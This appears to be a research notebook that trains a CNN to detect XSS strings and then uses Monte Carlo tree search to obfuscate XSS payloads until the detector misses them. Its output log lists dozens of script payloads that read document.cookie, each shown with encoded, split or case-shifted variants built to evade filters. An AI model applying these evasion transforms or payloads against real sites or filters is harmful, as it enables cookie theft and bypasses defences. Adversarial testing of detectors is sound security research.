# %% [markdown]
# <a href="https://colab.research.google.com/github/8sheeta8/Attack_Network_AI/blob/main/XSS.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %%
import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import Dataset, DataLoader
import numpy as np
from sklearn.metrics import classification_report

# ✅ GPU/CPU 자동 선택
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
print("사용 장치:", device)

# ✅ 1. 업로드된 npy 파일을 불러오는 Dataset 클래스
class XSSDataset(Dataset):
    def __init__(self, image_path, label_path):
        self.images = np.load(image_path).astype(np.float32) / 255.0
        self.labels = np.load(label_path).astype(np.int64)

        if len(self.images.shape) == 3:
            self.images = self.images[:, np.newaxis, :, :]  # (N, 1, 16, 16)

    def __len__(self):
        return len(self.labels)

    def __getitem__(self, idx):
        return torch.tensor(self.images[idx]), torch.tensor(self.labels[idx])

# ✅ 2. DataLoader 생성 함수
def create_dataloader_from_files(img_path, label_path, batch_size=32, shuffle=False):
    dataset = XSSDataset(img_path, label_path)
    return DataLoader(dataset, batch_size=batch_size, shuffle=shuffle)

# ✅ 3. AlexNet 기반 Discriminator 모델 정의
class DiscriminatorAlexNet(nn.Module):
    def __init__(self):
        super(DiscriminatorAlexNet, self).__init__()
        self.features = nn.Sequential(
            nn.Conv2d(1, 64, kernel_size=3, stride=1, padding=1),  # (16x16) -> (16x16)
            nn.ReLU(inplace=True),
            nn.MaxPool2d(kernel_size=2, stride=2),  # (16x16) -> (8x8)

            nn.Conv2d(64, 128, kernel_size=3, padding=1),  # (8x8) -> (8x8)
            nn.ReLU(inplace=True),
            nn.MaxPool2d(kernel_size=2, stride=2),  # (8x8) -> (4x4)
        )

        self.classifier = nn.Sequential(
            nn.Flatten(),
            nn.Linear(128 * 4 * 4, 256),
            nn.ReLU(inplace=True),
            nn.Linear(256, 2),  # Binary classification
        )

    def forward(self, x):
        x = self.features(x)
        x = self.classifier(x)
        return x

# ✅ 4. 학습 함수
def train_discriminator(model, train_loader, val_loader, epochs=10, lr=1e-3):
    model.to(device)
    optimizer = torch.optim.Adam(model.parameters(), lr=lr)
    criterion = nn.CrossEntropyLoss()

    for epoch in range(epochs):
        model.train()
        total_loss = 0
        correct = 0
        total = 0

        for x, y in train_loader:
            x, y = x.to(device), y.to(device)

            optimizer.zero_grad()
            out = model(x)
            loss = criterion(out, y)
            loss.backward()
            optimizer.step()

            total_loss += loss.item()
            pred = out.argmax(dim=1)
            correct += (pred == y).sum().item()
            total += y.size(0)

        acc = correct / total
        print(f"Epoch {epoch+1}/{epochs} | Loss: {total_loss:.4f} | Train Acc: {acc:.4f}")

        # 검증 정확도 출력
        model.eval()
        with torch.no_grad():
            correct = 0
            total = 0
            for x, y in val_loader:
                x, y = x.to(device), y.to(device)
                out = model(x)
                pred = out.argmax(dim=1)
                correct += (pred == y).sum().item()
                total += y.size(0)
            val_acc = correct / total
        print(f"           >> Val Acc: {val_acc:.4f}")

# ✅ 5. 테스트 평가 함수
def evaluate_model(model, test_loader):
    model.eval()
    preds = []
    targets = []
    with torch.no_grad():
        for x, y in test_loader:
            x = x.to(device)
            out = model(x)
            pred = out.argmax(dim=1).cpu().numpy()
            preds.extend(pred)
            targets.extend(y.numpy())

    print("\n✅ 최종 테스트 결과:")
    print(classification_report(targets, preds, target_names=["Normal", "XSS"]))

# ✅ 6. 파일 경로 지정 후 실행
train_loader = create_dataloader_from_files("train_images.npy", "train_labels.npy", shuffle=True)
val_loader = create_dataloader_from_files("val_images.npy", "val_labels.npy")
test_loader = create_dataloader_from_files("test_images.npy", "test_labels.npy")

model = DiscriminatorAlexNet()
train_discriminator(model, train_loader, val_loader, epochs=15, lr=1e-3)
evaluate_model(model, test_loader)
# Out:
# 사용 장치: cpu
# /usr/local/lib/python3.11/dist-packages/more_itertools/more.py:3599: RuntimeWarning: coroutine 'Capture._get_tshark_process' was never awaited
#   def filter_except(validator, iterable, *exceptions):
# RuntimeWarning: Enable tracemalloc to get the object allocation traceback
# Epoch 1/15 | Loss: 5.5016 | Train Acc: 0.9489
#            >> Val Acc: 0.9961
# Epoch 2/15 | Loss: 0.3893 | Train Acc: 0.9983
#            >> Val Acc: 1.0000
# Epoch 3/15 | Loss: 0.0509 | Train Acc: 0.9992
#            >> Val Acc: 1.0000
# Epoch 4/15 | Loss: 0.2948 | Train Acc: 0.9983
#            >> Val Acc: 1.0000
# Epoch 5/15 | Loss: 0.2588 | Train Acc: 0.9992
#            >> Val Acc: 1.0000
# Epoch 6/15 | Loss: 0.0034 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 7/15 | Loss: 0.0010 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 8/15 | Loss: 0.0008 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 9/15 | Loss: 0.0006 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 10/15 | Loss: 0.0006 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 11/15 | Loss: 0.0004 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 12/15 | Loss: 0.0004 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 13/15 | Loss: 0.0003 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 14/15 | Loss: 0.0003 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 15/15 | Loss: 0.0002 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
#
# ✅ 최종 테스트 결과:
#               precision    recall  f1-score   support
#
#       Normal       1.00      1.00      1.00       134
#          XSS       1.00      1.00      1.00       123
#
#     accuracy                           1.00       257
#    macro avg       1.00      1.00      1.00       257
# weighted avg       1.00      1.00      1.00       257

# %% [markdown]
#  1단계: 우회 기법 (Action) 정의

# %%
import random
import urllib.parse

def insert_comment(tag):
    return tag.replace("<", "<!-- -->") if "<" in tag else tag

def url_encode(tag):
    return urllib.parse.quote(tag)

def split_tag(tag):
    if "<script>" in tag:
        return tag.replace("<script>", "<scr<script>ipt>")
    return tag

def case_shift(tag):
    return ''.join(c.upper() if random.random() < 0.5 else c.lower() for c in tag)

def space_injection(tag):
    return tag.replace("<", "< ").replace(">", " >")

# 가능한 행동 집합
obfuscation_actions = [insert_comment, url_encode, split_tag, case_shift, space_injection]

# %% [markdown]
# 2단계: MCTS-T 노드 구조 정의

# %%
import numpy as np

class MCTSNode:
    def __init__(self, xss_string, depth=0, parent=None):
        self.xss = xss_string
        self.parent = parent
        self.children = []
        self.visits = 0
        self.reward = 0.0
        self.depth = depth
        self.action = None

    def is_leaf(self):
        return len(self.children) == 0

    def expand(self):
        for action in obfuscation_actions:
            new_str = action(self.xss)
            child = MCTSNode(new_str, depth=self.depth + 1, parent=self)
            child.action = action.__name__
            self.children.append(child)

    def ucb_score(self, c=1.41):
        if self.visits == 0:
            return float('inf')
        return (self.reward / self.visits) + c * ( (2 * np.log(self.parent.visits)) / self.visits ) ** 0.5

# %% [markdown]
#  3단계: MCTS 탐색 알고리즘

# %%
def select_promising_node(node):
    while not node.is_leaf():
        node = max(node.children, key=lambda n: n.ucb_score())
    return node

def backpropagate(node, reward):
    while node is not None:
        node.visits += 1
        node.reward += reward
        node = node.parent

# %% [markdown]
# 4단계: 보상 평가 함수 (Discriminator 활용)

# %%
import torch

def string_to_image_matrix(text, max_len=256):
    arr = np.zeros((16, 16), dtype=np.uint8)
    for i, c in enumerate(text[:max_len]):
        arr[i // 16][i % 16] = ord(c) if ord(c) < 256 else 0
    return arr

def calculate_reward(discriminator_model, xss_string):
    model = discriminator_model.eval().to(device)
    matrix = string_to_image_matrix(xss_string)
    tensor = torch.tensor(matrix, dtype=torch.float32).unsqueeze(0).unsqueeze(0).to(device) / 255.0
    with torch.no_grad():
        output = model(tensor)
        prob = torch.softmax(output, dim=1)[0][0].item()  # normal(0) 확률 = 탐지 실패 확률
    return prob

# %% [markdown]
# 5단계: 전체 Generator 실행

# %%
def generate_obfuscated_xss(original_xss, discriminator_model, max_iter=20):
    root = MCTSNode(original_xss)
    for _ in range(max_iter):
        node = select_promising_node(root)

        if node.visits == 0:
            reward = calculate_reward(discriminator_model, node.xss)
            backpropagate(node, reward)
        else:
            node.expand()
            if node.children:
                child = random.choice(node.children)
                reward = calculate_reward(discriminator_model, child.xss)
                backpropagate(child, reward)

    leaf_nodes = []
    def collect_leaves(n):
        if n.is_leaf(): leaf_nodes.append(n)
        else:
            for c in n.children:
                collect_leaves(c)
    collect_leaves(root)

    best = max(leaf_nodes, key=lambda n: n.reward / (n.visits + 1e-6))
    print(f"\n✅ 우회 결과: {best.xss}")
    print(f"⮕ 보상: {best.reward:.4f} | 방문 수: {best.visits} | 적용 행동: {best.action}")
    return best.xss

# %% [markdown]
# 실행

# %%
def generate_all_obfuscated_xss(input_path, output_path, discriminator_model, max_iter=30):
    with open(input_path, "r", encoding="utf-8") as f:
        original_samples = [line.strip() for line in f if line.strip()]

    print(f"총 {len(original_samples)}개 XSS 문자열 우회 생성 시작...")

    obfuscated_list = []
    for i, xss in enumerate(original_samples):
        print(f"\n[{i+1}/{len(original_samples)}] 원본: {xss}")
        obf = generate_obfuscated_xss(xss, discriminator_model, max_iter=max_iter)
        obfuscated_list.append(obf)

    with open(output_path, "w", encoding="utf-8") as f:
        for obf in obfuscated_list:
            f.write(obf + "\n")

    print(f"\n✅ 모든 우회 문자열 저장 완료 → {output_path}")

# %%
generate_all_obfuscated_xss(
    input_path="generator_input.txt",
    output_path="generator_output.txt",
    discriminator_model=model,
    max_iter=30
)
# Out:
# 총 874개 XSS 문자열 우회 생성 시작...
#
# [1/874] 원본: <script>console.log('BLV5DIBIS87PYKBE1QQHCJ22ET7LUGGUCPP9OTYYPSB697X2E7');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27BLV5DIBIS87PYKBE1QQHCJ22ET7LUGGUCPP9OTYYPSB697X2E7%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [2/874] 원본: <script>console.log('4IX6WF7YU8XE4XV7F78KR868GYBVZ8SLVEBA2WMLHD1NKP7ZVK');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%274IX6WF7YU8XE4XV7F78KR868GYBVZ8SLVEBA2WMLHD1NKP7ZVK%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [3/874] 원본: <script>console.log('9PRBGN0KXTIRDJWTY9DKY8IVZKIUDMTHH8PCBZ6PM37OLPFVG4');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%279PRBGN0KXTIRDJWTY9DKY8IVZKIUDMTHH8PCBZ6PM37OLPFVG4%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [4/874] 원본: <script>console.log('WPV1RRR4KHVU03DRW4HYNUYSNCSXSXHPHM6PYQZVFYOV8H4KNQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27WPV1RRR4KHVU03DRW4HYNUYSNCSXSXHPHM6PYQZVFYOV8H4KNQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [5/874] 원본: <script>console.log('2CBJ75LBD30SXIF6MLVV3UGZZKJNW3MZXSYLSUIHRM8JU2740F');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%272CBJ75LBD30SXIF6MLVV3UGZZKJNW3MZXSYLSUIHRM8JU2740F%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [6/874] 원본: <script>console.log('05WXMDQYHK5Q3D6GYEW7V8IM3UYHIMFOEIAZVE5R65PZL9U5RU');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscript%253Econsole.log%2528%252705WXMDQYHK5Q3D6GYEW7V8IM3UYHIMFOEIAZVE5R65PZL9U5RU%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [7/874] 원본: <script>console.log('L6OI4KXBDJAJE8IK4NYPSSD1XZTAFF7F3HBO78B92UC567POSO');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27L6OI4KXBDJAJE8IK4NYPSSD1XZTAFF7F3HBO78B92UC567POSO%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [8/874] 원본: <script>console.log('QGK8G8RA33TIM7J51IUWN9DBLUSM0ETCHNJNHAAB17A8ZSS191');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27QGK8G8RA33TIM7J51IUWN9DBLUSM0ETCHNJNHAAB17A8ZSS191%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [9/874] 원본: <script>console.log('YALJTURZHIW5HE8YHE69BGG8UYBCL708W474V406I9KBG65H7Z');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscript%253Econsole.log%2528%2527YALJTURZHIW5HE8YHE69BGG8UYBCL708W474V406I9KBG65H7Z%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [10/874] 원본: <script>console.log('WDFO6A9LFMN1DSRDJIYN1FWAXYOPCRHO896TKSV4WONVLL65R1');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27WDFO6A9LFMN1DSRDJIYN1FWAXYOPCRHO896TKSV4WONVLL65R1%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [11/874] 원본: <script>console.log('3FAV4J4Q4J8ATJT7KOP2F99OVOGGT0V3ZZMYEOEZPAUJE49OYE');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%273FAV4J4Q4J8ATJT7KOP2F99OVOGGT0V3ZZMYEOEZPAUJE49OYE%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [12/874] 원본: <script>console.log('2PVB2IUCZ3QPH7ZOSQV3H9S6Z6U292NH9569T3LT7WWEUGBF6Z');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CSCRipT%253ECOnSoLe.log%2528%25272pvb2iucZ3qPH7zOsQv3H9s6Z6U292nh9569t3lT7WWeuGBf6Z%2527%2529%253BCoNSOlE.lOg%2528docuMEnT.coOKie%2529%253B%253C/sCrIpt%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [13/874] 원본: <script>console.log('RS7GDWODIASI51T2294CKMST1RI0X0EYI0IXLD6OKU1FN7FFRS');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27RS7GDWODIASI51T2294CKMST1RI0X0EYI0IXLD6OKU1FN7FFRS%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [14/874] 원본: <script>console.log('W89CGMMK62E1GV49DBL7ONL9U5GBA4NZGY3S7GH4NZFLRIA8Y4');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27W89CGMMK62E1GV49DBL7ONL9U5GBA4NZGY3S7GH4NZFLRIA8Y4%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [15/874] 원본: <script>console.log('NQP9NIXMDV6R1KS5VZXRGLOINY6GLAVGORZ78KX57QML5M4LKQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27NQP9NIXMDV6R1KS5VZXRGLOINY6GLAVGORZ78KX57QML5M4LKQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [16/874] 원본: <script>console.log('8RX9CMTFK1Q8NBICVGXSMZQVAC8GV98FDVGQ4IL2RUYKAIDWQ6');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%278RX9CMTFK1Q8NBICVGXSMZQVAC8GV98FDVGQ4IL2RUYKAIDWQ6%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [17/874] 원본: <script>console.log('WAMPEBQCWGNOLZAPBL7VTY7HCIZDIFZ3QLD0CKLY37IN5JTUEA');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27WAMPEBQCWGNOLZAPBL7VTY7HCIZDIFZ3QLD0CKLY37IN5JTUEA%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [18/874] 원본: <script>console.log('WOTQT2NC6A9ZG57NK0EDNC1DUCIYKUF1K6KJ48T09PWIMPVHLG');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27WOTQT2NC6A9ZG57NK0EDNC1DUCIYKUF1K6KJ48T09PWIMPVHLG%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [19/874] 원본: <script>console.log('PG5I5CY8V37HR0DQ9OAEKZ871KG22KXSUR4994YALYGU3GIYRR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: < !-- -- >scr< !-- -- >script >ipt >console.log('PG5I5CY8V37HR0DQ9OAEKZ871KG22KXSUR4994YALYGU3GIYRR');console.log(document.cookie);< !-- -- >/script >
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: space_injection
#
# [20/874] 원본: <script>console.log('0BD8TMDNJ0T3FFK3890XRM5X5N3KLM44O4ST5NST7WG7XSXNTQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%270BD8TMDNJ0T3FFK3890XRM5X5N3KLM44O4ST5NST7WG7XSXNTQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [21/874] 원본: <script>console.log('2JL6WH4Z06OV182ZEXKMG045QWGSI84FJ0QB3V4RVOFU3MA4EX');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%272JL6WH4Z06OV182ZEXKMG045QWGSI84FJ0QB3V4RVOFU3MA4EX%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [22/874] 원본: <script>console.log('C68CQEEJGR90P7FOGIW5UNLNAY5VUFY5HJ4H7HF044FEIYW1NL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: < !-- -- >scr< !-- -- >script >ipt >console.log('C68CQEEJGR90P7FOGIW5UNLNAY5VUFY5HJ4H7HF044FEIYW1NL');console.log(document.cookie);< !-- -- >/script >
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: space_injection
#
# [23/874] 원본: <script>console.log('IM5P8ZBU13AX6LYH55GTDSW39ARPDUMODWYL3W41N9LQALMZFR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %25253Cscript%25253Econsole.log%252528%252527IM5P8ZBU13AX6LYH55GTDSW39ARPDUMODWYL3W41N9LQALMZFR%252527%252529%25253Bconsole.log%252528document.cookie%252529%25253B%25253C/script%25253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [24/874] 원본: <script>console.log('6G3Z53O372DILG22HB7XVJBHEKGM4CI10V925N1E8YH11ALUAM');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%276G3Z53O372DILG22HB7XVJBHEKGM4CI10V925N1E8YH11ALUAM%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [25/874] 원본: <script>console.log('WNRON60D3UVZGDRBQ9AP9IYXRAHGNR87XNEOS1TUC437UAW3ZX');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27WNRON60D3UVZGDRBQ9AP9IYXRAHGNR87XNEOS1TUC437UAW3ZX%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [26/874] 원본: <script>console.log('MPMDSL7JFOJBBHIIXAW1RBW9AUWERPZF1PGQVTAKCA93IKK9KP');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27MPMDSL7JFOJBBHIIXAW1RBW9AUWERPZF1PGQVTAKCA93IKK9KP%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [27/874] 원본: <script>console.log('SJBLOE5DZ6NAIQS6XZV5VXPATIQKSKUNWJYUHQEY7SZ3MGIK1T');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27SJBLOE5DZ6NAIQS6XZV5VXPATIQKSKUNWJYUHQEY7SZ3MGIK1T%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [28/874] 원본: <script>console.log('1GSB4HQAP0NBQC0ODZD420WU8PSHAOJBJUCHIYF6UA9B7WR8NL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%271GSB4HQAP0NBQC0ODZD420WU8PSHAOJBJUCHIYF6UA9B7WR8NL%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [29/874] 원본: <script>console.log('ZO6C2LBBY42SFPLZMGVGE8PMJAHLTBAQ3P88I6FH6ATP1TYHUX');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CsCrIPT%253ECOnSOLe.log%2528%2527zo6c2LBBy42sfpLzmgvGE8pmjaHltBaq3P88I6fh6ATp1TYhux%2527%2529%253BcoNSole.lOG%2528DocUment.cOOKie%2529%253B%253C/sCRipt%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [30/874] 원본: <script>console.log('54PM06LFQOJCB2KK8PBRACA05P2XSQVSN5OV8EKJ1P0E4AD7ZC');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%2754PM06LFQOJCB2KK8PBRACA05P2XSQVSN5OV8EKJ1P0E4AD7ZC%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [31/874] 원본: <script>console.log('OGL4NN1CWBSR73VRN12ZUCHOX8OSAH18ZFHA3HZLBS0UW1X3XR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27OGL4NN1CWBSR73VRN12ZUCHOX8OSAH18ZFHA3HZLBS0UW1X3XR%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [32/874] 원본: <script>console.log('XYAH310SWMHQWQ7S8YXD375UGRBP501WUM2PJQ77OLQ4CU3KH5');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27XYAH310SWMHQWQ7S8YXD375UGRBP501WUM2PJQ77OLQ4CU3KH5%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [33/874] 원본: <script>console.log('VV8NUVBFRWPMXM13XWLQY35VT6L2EYB5AL8L6CIOE14J468HF1');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27VV8NUVBFRWPMXM13XWLQY35VT6L2EYB5AL8L6CIOE14J468HF1%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [34/874] 원본: <script>console.log('T02TLH1ZX5CU0T3UU4OR47TLPXCSW4J0WAVANAY15PK4XAEUSL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27T02TLH1ZX5CU0T3UU4OR47TLPXCSW4J0WAVANAY15PK4XAEUSL%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [35/874] 원본: <script>console.log('P2E2HAIDNIPBU358SNFXXLT0T3KLBL67Z6W2FE6ICVZXZ1HTHT');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscript%253Econsole.log%2528%2527P2E2HAIDNIPBU358SNFXXLT0T3KLBL67Z6W2FE6ICVZXZ1HTHT%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [36/874] 원본: <script>console.log('H03YK8FS27AQY6673MF0MDH1KCMGMXLUC0JLNR5ERWLQKRO1AT');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27H03YK8FS27AQY6673MF0MDH1KCMGMXLUC0JLNR5ERWLQKRO1AT%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [37/874] 원본: <script>console.log('1SYQD27Q6E6NBV0TEQA9GKMVFQA9PVXO2PC5R6ZDB2KDV4DBUI');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%271SYQD27Q6E6NBV0TEQA9GKMVFQA9PVXO2PC5R6ZDB2KDV4DBUI%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [38/874] 원본: <script>console.log('2QSW4M9XQEEOYEUD3VYRP48GO6PHFIIT8RIFN918AMWU860GCU');console.log(document.cookie);</script>
#
# ✅ 우회 결과: < !-- -- >scr< !-- -- >script >ipt >console.log('2QSW4M9XQEEOYEUD3VYRP48GO6PHFIIT8RIFN918AMWU860GCU');console.log(document.cookie);< !-- -- >/script >
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: space_injection
#
# [39/874] 원본: <script>console.log('LD4CKTW5USS857LFFXESSCTEUOBZ7EIR4G3NPXAJBAEPFUXGG4');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CsCript%253EcOnSoLE.log%2528%2527lD4cktw5Uss857lFfXeSSCTEUOBz7Eir4g3NPXAJbAepfUxGg4%2527%2529%253BcOnSOle.lOG%2528dOcUMEnT.COokie%2529%253B%253C/ScriPt%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [40/874] 원본: <script>console.log('AMJ6M403OFJAKYORXO5BPF5ADR2AR1KZNWBRHAQOEPDFO5QDJQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27AMJ6M403OFJAKYORXO5BPF5ADR2AR1KZNWBRHAQOEPDFO5QDJQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [41/874] 원본: <script>console.log('3I4CBO6UWSEXUVNZ9C5K4MNN7TCLKTJN7BLWIPA1N87F46G5Y7');console.log(document.cookie);</script>
#
